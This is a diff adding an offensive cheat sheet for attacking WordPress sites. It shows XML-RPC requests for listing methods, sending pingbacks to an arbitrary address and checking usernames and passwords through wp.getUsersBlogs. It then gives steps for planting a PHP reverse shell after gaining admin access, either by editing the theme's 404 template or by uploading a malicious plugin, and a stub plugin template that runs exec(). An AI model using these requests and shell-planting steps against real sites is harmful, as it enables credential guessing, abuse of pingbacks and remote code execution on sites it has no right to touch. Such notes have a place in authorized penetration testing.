@@ -1,0 +1,67 @@
+### list possible methods using rpc api
+```
+POST /xmlrpc.php HTTP/1.1
+Host: <domain>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Content-Length: XXX
+
+<methodCall>  
+<methodName>system.listMethods</methodName>  
+<params></params>  
+</methodCall>  
+```
+
+### example - send a ping
+```
+POST /xmlrpc.php HTTP/1.1
+Host: <domain>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Content-Length: XXX
+
+<methodCall>  
+<methodName>pingback.ping</methodName>  
+<params><param>  
+<value><string>http://XXX.XXX.XXX.XXX:XX</string></value>  
+</param><param><value><string>https://<domain>/wordpres?p=1</string>  
+</value></param></params>  
+</methodCall>  
+```
+
+### methods for enumeration
+```
+wp.getUserBlogs
+wp.getCategories
+metaWeblog.getUsersBlogs
+
+<methodCall>  
+<methodName>wp.getUsersBlogs</methodName>  
+<params>  
+<param><value>username</value></param>  
+<param><value>password</value></param>  
+</params>  
+</methodCall>  
+```
+
+
+### upload reverse shell with admin access - using custom 404 page
+```
+Appearance > Editor/Theme Editor > Theme Files > 404/404 Template > Selected file content > <phpReverseShell> > Update File
+```
+
+### upload reverse shell with admin access - using malicious plugin
+```
+Plugins > Add New > Upload Plugin > Browse > Choose PHP reverse shell (rev.zip) > Install > Activate Plugin
+```
+
+### template of PHP reverse shell
+```
+<?php
+/**
+* Plugin Name: Wordpress Reverse Shell
+* Author: Haxxor
+*/
+
+exec("<command>")  
+?>  
+```
+
